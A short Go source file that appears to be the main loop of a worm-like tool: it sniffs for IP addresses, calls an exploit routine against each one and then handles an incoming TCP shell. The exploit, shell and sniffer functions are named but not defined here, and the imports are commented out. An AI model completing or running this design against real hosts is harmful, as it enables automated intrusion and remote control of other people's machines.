package main
/*
import (
  //"fmt"
  //"time"
  "bufio"
  "os"
)
*/
func Infect(ip string){
  go LaunchExploit(ip)
  ListenAndHandleTCPShell()
}

func main(){
  ip_passing_channel := make(chan string)
  go ListenForSnifferData(ip_passing_channel)

  for ip := range ip_passing_channel {
    Infect(ip)
  }
}
